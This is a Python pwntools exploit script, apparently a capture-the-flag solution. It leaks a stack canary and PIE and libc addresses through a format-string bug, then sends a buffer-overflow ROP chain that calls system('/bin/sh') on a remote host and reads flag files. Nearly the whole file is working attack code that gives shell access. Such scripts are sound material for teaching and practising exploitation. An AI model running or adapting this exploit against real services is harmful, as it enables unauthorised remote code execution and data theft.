#!/usr/bin/env python3
from pathlib import Path
import re
import time
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "chall"
LIBC_PATH = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.arch = "amd64"
context.log_level = args.LOG or "info"

HOST = args.HOST or "35.192.106.100"
PORT = int(args.PORT or 20003)

FMT = b"%23$p|%25$p|%29$p"

BUF_TO_CANARY = 0x88
PIE_RET_OFF = 0x1147
LIBC_RET_OFF = 0x2A1CA


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            env={"LD_LIBRARY_PATH": str(BASE_DIR)},
            gdbscript="""
set pagination off
continue
""",
        )

    return process([str(BINARY_PATH)], env={"LD_LIBRARY_PATH": str(BASE_DIR)})


def parse_leaks(data: bytes):
    log.debug("leak chunk: %r", data)

    m = re.search(
        rb"(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)",
        data,
    )
    if not m:
        raise RuntimeError(f"could not parse leaks from: {data!r}")

    canary, pie_ret, libc_ret = (int(x, 16) for x in m.groups())

    if (canary & 0xFF) != 0:
        raise RuntimeError(f"bad canary leak: {canary:#x}")

    if (pie_ret & 0xFFF) != (PIE_RET_OFF & 0xFFF):
        log.warning(
            "PIE leak low bits unusual: leak=%#x expected_low=%#x",
            pie_ret,
            PIE_RET_OFF & 0xFFF,
        )

    if (libc_ret & 0xFFF) != (LIBC_RET_OFF & 0xFFF):
        log.warning(
            "libc leak low bits unusual: leak=%#x expected_low=%#x",
            libc_ret,
            LIBC_RET_OFF & 0xFFF,
        )

    return canary, pie_ret, libc_ret


def build_payload(canary: int) -> bytes:
    rop = ROP(libc)

    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym.system
    exit_ = libc.sym.exit

    log.info("ret     = %#x", ret)
    log.info("pop rdi = %#x", pop_rdi)
    log.info("system  = %#x", system)
    log.info("exit    = %#x", exit_)
    log.info("/bin/sh = %#x", binsh)

    payload = flat(
        b"A" * BUF_TO_CANARY,
        p64(canary),
        p64(0),          # saved rbx / callee-saved slot
        p64(ret),        # stack alignment for system()
        p64(pop_rdi),
        p64(binsh),
        p64(system),
        p64(exit_),
    )

    if len(payload) > 0x200:
        raise RuntimeError(f"payload too large: {len(payload)} bytes")

    return payload


def exploit(io):
    io.recvuntil(b"vault> ", timeout=5)
    io.sendline(FMT)

    data = io.recvuntil(b"one more gift?", timeout=5)
    canary, pie_ret, libc_ret = parse_leaks(data)

    pie_base = pie_ret - PIE_RET_OFF
    libc.address = libc_ret - LIBC_RET_OFF

    log.success("canary    = %#x", canary)
    log.success("PIE base  = %#x", pie_base)
    log.success("libc base = %#x", libc.address)

    payload = build_payload(canary)

    log.info("sending %d-byte overflow payload", len(payload))
    io.send(payload)

    # Jangan pakai io.poll() di sini.
    # remote() tidak punya .poll(), hanya process() yang punya.
    time.sleep(0.35)

    cmd = args.CMD.encode() if args.CMD else (
        b"echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id"
    )
    io.sendline(cmd)

    try:
        out = io.recvrepeat(1.5)
        if out:
            print(out.decode(errors="replace"), end="")
    except EOFError:
        pass

    io.interactive()


def main():
    io = start()
    exploit(io)


if __name__ == "__main__": 
   main()
